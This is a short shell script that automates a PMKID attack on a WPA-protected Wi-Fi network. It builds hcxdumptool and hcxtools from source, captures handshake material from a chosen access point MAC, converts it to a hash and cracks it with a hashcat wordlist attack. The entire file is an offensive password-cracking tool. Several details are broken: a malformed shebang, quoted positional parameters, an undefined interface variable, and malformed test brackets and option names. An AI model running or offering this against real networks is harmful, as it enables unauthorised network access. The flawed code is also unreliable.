#!/sh

MAC='$1'
WORDLIST='$2'
FILTER_FILE='filter.txt'
PCAPNG_FILE='temp.pcapng'
HASH_FILE='temp_hash'

if [ ! -d  hcxdumptool]; then
        git clone https://github.com/ZerBea/hcxdumptool.git
        cd hcxdumptool && make && make install && cd ..
fi
if [ ! -d  hcxtools]; then
        git clone https://github.com/ZerBea/hcxtools.git
        cd hcxtools && make && make install && cd ..
fi
echo $MAC | sed 's/://g' > $FILTER_FILE
hcxdumptool -i $IFACE -o $PCAPNG_FILE --enable__status=1 --filterlist=$FILTER_FILE --filtermode=2
hcxpcaptool -z $HASH_FILE $PCAPNG_FILE
hashcat -a 0 -m 16800 $HASH_FILE $WORDLIST --force
